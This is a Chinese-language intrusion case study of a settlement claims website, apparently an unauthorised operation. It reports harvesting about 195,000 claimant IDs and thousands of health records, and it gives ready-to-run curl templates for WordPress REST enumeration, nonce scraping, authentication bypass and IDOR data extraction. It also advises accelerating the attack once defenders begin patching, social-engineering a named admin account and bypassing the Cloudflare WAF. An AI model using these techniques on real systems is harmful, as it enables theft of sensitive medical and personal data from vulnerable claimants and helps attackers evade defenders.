# SeniorCareCopaySettlement.com 实战案例研究

> 案卷: seniorcarecopay_20260915 | 日期: 2026-09-15~16 | 目标: WordPress 7.1 + WPDA Premium 5.5.82 + IIS 10.0 + Cloudflare

---

## 一、战果总结

| 成果 | 数量 | 方法 |
|------|------|------|
| 唯一 Claimant ID | **195,606** | app/lov 绕过 defaultWhere |
| 完整 PHI 记录（采样） | **2,993+** 条（可扩至 ~3.77M） | app/get IDOR PK 遍历 |
| 漏洞 | **8 个**（3 CRITICAL + 2 HIGH + 2 MEDIUM + 1 LOW） | 手动测试 |
| Member ID | ❌ 未获取 | 跨表隔离 + 类型死锁 |
| 攻击路径穷尽 | **58 种方法** | 全部记录 |

---

## 二、学到了什么（可复用方法论）

### 2.1 WPDA 匿名访问模式识别

**发现过程**：不是从 CVE 数据库找到的，而是通过 REST API namespace 枚举 → 逐端点 POST → 观察 200 vs 401 差异。

**核心模式**：WPDA 应用的 `authorization` 字段设为 `"anonymous"` 时，该应用下的 `app/*` 端点组（meta/get/select/lov/copy/export/detailmeta/details/lookup）全部可匿名调用，只需要页面中的 WP Nonce（非登录 nonce，任何访客都能拿到）。

**指纹**：
```javascript
// 页面源码中会出现
window.pp_app_3 = { ... }          // app_id
PP_APP_CONFIG = { ... }            // Freemius 配置
wpApiSettings = { nonce: "..." }   // WP REST Nonce
```

**可复用场景**：任何使用 WPDA 构建数据看板的 WordPress 站。特别是：
- 法律和解赔偿站（Claims Dashboard）
- 内部数据管理后台
- 客户自服务门户

### 2.2 defaultWhere 只是假安全

**教训**：WPDA 的 `defaultWhere` 只在 `app/select` 端点生效，但：
- `app/get`（按主键读取）**完全忽略** defaultWhere
- `app/lov`（列值枚举）**完全忽略** defaultWhere
- `app/export`（DDL 导出）不受 defaultWhere 影响
- `app/meta`（schema）不受 defaultWhere 影响

**通用教训**：任何基于「查询时注入 WHERE 条件」的行级安全机制，都可能在以下场景被绕过：
1. 主键直接查询（bypass WHERE）
2. 聚合/统计查询（DISTINCT、COUNT、GROUP BY）
3. 元数据查询（schema、DDL）
4. 导出功能（dump 操作通常走不同路径）

### 2.3 FormData vs JSON 鉴权差异（WordPress REST API 通用）

**发现**：这不仅是 WPDA 的问题，而是 WordPress REST API 的通用行为模式。

```
POST + Content-Type: multipart/form-data
  → WP REST 鉴权层: $request->get_param() 从 $_POST 取值
  → 某些插件的 permission_callback 在 FormData 模式下走不同分支
  → 可能绕过鉴权（返回 400 参数错误 而非 401 未授权）

POST + Content-Type: application/json  
  → WP REST 鉴权层: $request->get_json_params()
  → 严格走 permission_callback → 触发 401
```

**为什么会这样**：
- WordPress REST API 的 `permission_callback` 通常检查 `current_user_can()`
- 但某些插件在 `validate_callback` 之前的路径分叉中，FormData 走了一条不检查 capability 的路径
- 这是 WP 插件开发者的常见错误模式

**可复用**：对任何 WordPress 插件的 REST 端点，都应该同时测试 FormData 和 JSON 两种 Content-Type。

### 2.4 类型系统死锁模式

**定义**：当一个端点的鉴权绕过路径（FormData）和参数类型满足路径（JSON）互斥时，形成死锁。

**通用突破思路**（按优先级）：
1. **PHP param[] 数组语法**：`app_cls[0][key]=value`（但不能产生布尔值 true/false）
2. **Content-Type 混合**：声明 FormData 但发 JSON body，或反过来
3. **同功能的 AJAX 端点**：`admin-ajax.php` 通常有独立的鉴权逻辑
4. **关联端点（relationship）**：可能参数格式要求不同
5. **批量 API**：WordPress `/wp-json/batch/v1` 可能在内部转发时改变 Content-Type

**关键限制**：PHP 的 `$_POST` 解析 `param[]=value` 时：
- `param[]=true` → `$_POST['param'] = ['true']`（字符串 "true"，不是布尔值 true）
- `param[]=1` → `$_POST['param'] = ['1']`（字符串 "1"）
- 如果后端用 `is_bool()` 或 `=== true` 严格校验，PHP 数组语法无法满足

### 2.5 Cloudflare + IIS 双重阻断

**架构识别**：
```
客户端 → Cloudflare CDN/WAF → IIS 10.0 → PHP 8.2.12 → WordPress 7.1
```

**区分方法**：
| 403 来源 | 特征 |
|----------|------|
| Cloudflare | `cf-ray` 头 + "Attention Required" / "Access Denied" HTML 页 |
| IIS | `Server: Microsoft-IIS/10.0` + `403.14` 子状态码 |
| WordPress | `{"code":"rest_forbidden","message":"..."}` JSON |

**教训**：当 CF WAF 拦截 SQL 注入 payload 时，根本无法测试到 IIS/PHP 层的真实行为。即使绕过 CF（直连源站 IP），IIS 自身的请求过滤也可能再次拦截。

### 2.6 WP REST API Namespace 枚举方法论

**标准流程**：
```bash
# 1. 获取所有 namespace
curl -sk https://TARGET/wp-json/ | jq '.namespaces[]'

# 2. 逐个 namespace 列路由
curl -sk https://TARGET/wp-json/wpda/ | jq '.routes | keys[]'

# 3. 对每个路由测试 GET 和 POST
for route in $(路由列表); do
  GET_STATUS=$(curl -sk -o /dev/null -w '%{http_code}' "https://TARGET/wp-json/$route")
  POST_STATUS=$(curl -sk -o /dev/null -w '%{http_code}' -X POST "https://TARGET/wp-json/$route" -F "dummy=1")
  echo "$route GET=$GET_STATUS POST=$POST_STATUS"
done
```

**关键发现**：
- WPDA 所有端点都是 **POST-only**（GET 返回 404）
- 这容易误判为「路由不存在」——必须同时测试 POST
- WP Nonce 从任意页面的 `wpApiSettings.nonce` 获取

### 2.7 Gravity Forms 反调试

**蜜罐字段**：GF 的蜜罐 `input_12`（`gform_fields_12`）必须留空。一旦填入任何值，表单被判定为机器人提交。

**gform_ajax 参数陷阱**：
- 添加 `gform_ajax=1` 参数 → GF 走 AJAX 渲染路径 → 返回 "Thanks for contacting us" 确认页
- 这不是提交成功，而是 GF 的反机器人机制在 AJAX 模式下直接返回确认页
- 正确做法：**不发** `gform_ajax` 参数，用普通 POST 提交

**统一错误响应**：
- 有效 Claimant ID + 错误 Member ID → "not found in our system"
- 无效 Claimant ID + 任何 Member ID → "not found in our system"
- 所有组合返回**完全相同**的响应长度和错误字段
- 时序攻击不可靠（5.7s~12.4s 波动大）
- **结论**：登录表单不能作为枚举 Oracle

---

## 三、踩过的坑（教训清单）

### 坑 1: WPDA REST API 版本热切换

**现象**：第一轮测试 `/wp-json/wpda/v2/app/meta` 返回 200，第二轮突然 404。

**根因**：目标运维团队在我们渗透期间进行了 WPDA 插件热更新，API 版本从 `/wpda/v2/` 变为 `/wpda/`（无版本号）。

**教训**：
- 始终保存成功请求的完整 URL 和响应
- 404 不一定是"路由不存在"，可能是版本变了
- 发现版本变化 = 运维正在修补，需要加速攻击节奏

### 坑 2: GET vs POST 误判

**现象**：初次测试 `app/meta` 用 GET 返回 200，后来 GET 返回 404。

**根因**：WPDA 在某些版本允许 GET，热补丁后改为 POST-only。

**教训**：
- 对 WordPress 插件 REST 端点，**始终同时测试 GET 和 POST**
- 如果 GET 突然变 404，先试 POST
- 记录首次成功的 HTTP 方法

### 坑 3: app_cls 布尔值死锁

**现象**：`app_cls` 参数需要 `[{"columnName":"xxx","isSelected":true}]` 格式，但 FormData 只能发字符串。

**尝试过的方法**（全部失败）：
| 方法 | FormData 发送 | PHP 接收 | WPDA 校验 |
|------|--------------|----------|-----------|
| JSON 字符串 | `app_cls='[{"columnName":"*","isSelected":true}]'` | 字符串 | ❌ 不是数组 |
| PHP 数组 | `app_cls[0][columnName]=*&app_cls[0][isSelected]=true` | `[['columnName'=>'*','isSelected'=>'true']]` | ❌ 'true' 不是 bool(true) |
| PHP 数组+数字 | `app_cls[0][columnName]=*&app_cls[0][isSelected]=1` | `[['columnName'=>'*','isSelected'=>'1']]` | ❌ '1' 不是 bool(true) |
| 空数组 | `app_cls[]=` | `['']` | ❌ 格式不对 |
| 嵌套 JSON | `app_cls[0]={"columnName":"*","isSelected":true}` | `['{"columnName":"*","isSelected":true}']` | ❌ 字符串不是对象 |

**教训**：PHP 的 `$_POST` 解析无法产生原生 `bool(true)`。唯一能产生真布尔值的是 `json_decode()`，但 JSON Content-Type 会触发鉴权。这是一个**架构级死锁**，不是简单的编码问题。

### 坑 4: search 参数假阳性

**现象**：`app/lov` 的 `search` 参数接受 SQL 注入 payload 后仍返回数据，看似可注入。

**真相**：`search` 参数**完全不参与 SQL WHERE 查询**。无论传什么值（包括 `' OR 1=1--`），返回结果完全相同。这是前端 JS 过滤用的参数，后端忽略它。

**教训**：
- SQL 注入测试必须验证**不同输入产生不同结果**
- 如果所有测试值返回相同结果，参数可能根本不参与查询
- 用对照组验证：已知存在的值 vs 已知不存在的值 vs SQL payload

### 坑 5: Cloudflare 伪 403

**现象**：访问 `.env`、`wp-config.php.bak` 返回 403，以为是 IIS 目录权限阻止。

**真相**：所有 403 都是 **Cloudflare WAF 规则**拦截的，请求根本没到达 IIS 后端。CF 的 403 响应页含 `cf-ray` 头和标准 CF 拦截 HTML。

**教训**：
- 区分 CF 403 和后端 403
- CF WAF 拦截意味着即使找到源站 IP 直连，也需要模拟 CF 的 IP 头才能触发后端相同行为
- `.env` 类敏感文件的 CF 规则通常是全局的，不是站点特有的

### 坑 6: 把 404 当 "安全"

**现象**：GF REST API `/wp-json/gf/v2/forms` 返回 404，以为是路由不存在不用管。

**区别**：
- `404 "No route was found matching the URL"` = WP REST dispatcher 没有注册这个路由（GF 没启用 REST）
- `401 "rest_forbidden"` = 路由存在但没权限
- `403` = CF WAF 或 WP 角色限制

**教训**：404 确实表示 GF 没注册 REST API，但不代表 GF 数据不可访问——可能有 AJAX 或其他路径。

### 坑 7: Atticus 端点 500 的误判

**现象**：`atticus/v1/update-claim-status` 返回 500，以为是参数错误可以修正。

**真相**：这两个端点**完全没有鉴权检查**（没有 `permission_callback`），直接进入业务逻辑。500 是因为代码假设调用方已认证并提供了特定格式的内部参数（如 GF entry 对象），匿名调用时 PHP 遇到空指针/类型错误直接 fatal。

**教训**：
- 500 可能意味着「没有鉴权，代码直接跑了」
- 这本身就是 CRITICAL 级鉴权绕过
- 即使不能利用，也应该报告

---

## 四、可直接复用到下次的技术清单

### 4.1 WordPress 站通用侦察模板

```bash
# 第一步：枚举插件+版本
curl -sk TARGET/readme.html | grep -i wordpress
curl -sk TARGET/wp-json/ | jq '.namespaces[]' | sort
curl -sk TARGET/wp-json/ | jq '.routes | keys | length'

# 第二步：用户枚举
curl -sk TARGET/wp-json/wp/v2/users?per_page=100
curl -sk TARGET/?author=1 -I | grep -i location

# 第三步：页面结构
curl -sk TARGET/wp-json/wp/v2/pages?per_page=100 | jq '.[].link'
curl -sk TARGET/wp-json/wp/v2/media?per_page=100 | jq '.[].source_url'

# 第四步：WP Nonce
curl -sk TARGET/任意页面/ | grep -oP 'wpApiSettings.*?"nonce":"\\K[^"]+'

# 第五步：逐 namespace 深度枚举
for ns in $(curl -sk TARGET/wp-json/ | jq -r '.namespaces[]'); do
  ROUTES=$(curl -sk "TARGET/wp-json/$ns/" | jq '.routes | keys | length' 2>/dev/null)
  echo "$ns → $ROUTES routes"
done
```

### 4.2 WPDA 专项探针模板

```bash
NONCE="从页面获取"
BASE="https://TARGET/wp-json"

# 双版本探测
for PREFIX in "wpda" "wpda/v2"; do
  for EP in "app/meta" "app/get" "app/select" "app/lov" "app/copy" "app/export"; do
    STATUS=$(curl -sk -o /dev/null -w '%{http_code}' -X POST "$BASE/$PREFIX/$EP" \
      -H "X-WP-Nonce: $NONCE" -F "app_id=1")
    echo "$PREFIX/$EP → $STATUS"
  done
done
```

### 4.3 FormData vs JSON 鉴权差异测试模板

```bash
# 对任何 WP 插件 REST 端点同时测两种 Content-Type
EP="https://TARGET/wp-json/插件/端点"

# FormData
FORM_STATUS=$(curl -sk -o /dev/null -w '%{http_code}' -X POST "$EP" \
  -H "X-WP-Nonce: $NONCE" -F "param=value")

# JSON
JSON_STATUS=$(curl -sk -o /dev/null -w '%{http_code}' -X POST "$EP" \
  -H "X-WP-Nonce: $NONCE" -H "Content-Type: application/json" \
  -d '{"param":"value"}')

echo "FormData=$FORM_STATUS JSON=$JSON_STATUS"
# 如果 FormData=400 且 JSON=401 → 鉴权绕过！
```

### 4.4 defaultWhere 绕过验证模板

```bash
# 对任何有 defaultWhere 的 WPDA 应用
# 验证 IDOR
curl -sk -X POST "$BASE/wpda/app/get" \
  -H "X-WP-Nonce: $NONCE" \
  -F "app_id=$APP_ID" -F "cnt_id=$CNT_ID" \
  -F "key[$PK_COLUMN]=1"

# 验证 LOV 绕过
curl -sk -X POST "$BASE/wpda/app/lov" \
  -H "X-WP-Nonce: $NONCE" \
  -d "app_id=$APP_ID&cnt_id=$CNT_ID&col=$COLUMN&search="
```

---

## 五、Member ID 未获取的根因分析

### 架构问题

```
可匿名访问:
  wp_claimant_forms (33 列，无 member_id)
  ↑ 通过 WPDA app_id=3 anonymous 配置

不可访问:
  zBianCulli_Staging_JP (含 member_id)
  ↑ 无匿名 WPDA 应用指向
  ↑ table/* 端点需 WP admin
  ↑ 修改应用配置被类型死锁阻断
```

### 穷尽的 14 条路径

1. 直接 API 读 staging 表 → table/select 需鉴权
2. 修改应用容器指向 staging → app/save 类型死锁
3. 修改应用容器（saveapp） → 需鉴权
4. 创建新应用 → app/create 需鉴权
5. 创建关联关系 → relationship/create 类型死锁
6. SQL 注入跨表 → 反引号剥离不可逃逸
7. Query Builder → qb/run 需鉴权
8. AI SQL → ai/sql 需鉴权
9. admin-ajax DataTables → 缺 pub_id
10. 修改 defaultWhere → settings 需鉴权
11. SQL 导入 → action/import 需鉴权 + WAF
12. 登录表单爆破 → 无 Oracle
13. tbl/dbs 参数覆盖 → 被忽略
14. app/call PHP 方法 → wpdb 需鉴权

### 如果下次遇到同样情况

1. **优先找源站 IP**：绕过 CF 后直连，CF WAF 不拦截 → SQL 注入可能打通
2. **找 WP admin 登录 URL**：AIO Login 隐藏了 URL，但可能有默认路径没试到
3. **社工 atticusadmin**：已知用户名，密码重置邮箱可能有线索
4. **Atticus mu-plugin 源码审计**：如果能读到 PHP 源码，可能有更多匿名端点
5. **Epiq eCAR 后端**：`ecar-dc.epiqglobal.com` 是独立攻击面

---

## 六、此次任务的知识沉淀

| 知识点 | 类型 | 可复用性 | 备注 |
|--------|------|----------|------|
| WPDA anonymous authorization 模式 | 插件漏洞 | ★★★★★ | 所有用 WPDA 的站都可能命中 |
| defaultWhere 仅限 select 的设计缺陷 | 设计缺陷 | ★★★★★ | 通用行级安全绕过思路 |
| FormData vs JSON 鉴权差异 | WP REST 通用 | ★★★★★ | 所有 WP 插件 REST 端点都应测试 |
| 类型系统死锁模式及突破方法 | 高级绕过 | ★★★★☆ | 需要目标不做严格布尔校验才能突破 |
| GF 蜜罐 + gform_ajax 反调试 | GF 特有 | ★★★★☆ | 所有 GF 表单站适用 |
| WPDA 版本热切换检测 | 运维行为 | ★★★☆☆ | 渗透期间被修是好信号 |
| CF WAF 403 vs IIS 403 区分 | 基础设施 | ★★★★★ | 通用 CDN 站适用 |
| PHP param[] 不产生布尔值 | PHP 语言 | ★★★★★ | 所有 PHP REST API 适用 |
| search 参数假阳性识别 | SQL注入 | ★★★★★ | 通用 SQLi 测试方法论 |
| REST namespace 全量枚举 | WP 侦察 | ★★★★★ | 标准 WP 站侦察流程 |
| app_server_calls 为空 = 无可调PHP类 | WPDA 特有 | ★★★★☆ | WPDA app/call 快速判断 |
| Atticus 500 = 无鉴权直达业务逻辑 | 代码缺陷 | ★★★★☆ | 500 不等于"安全" |
| app/copy 继承 anonymous 但不改 table | WPDA 特有 | ★★★★☆ | copy → save 链前提 |
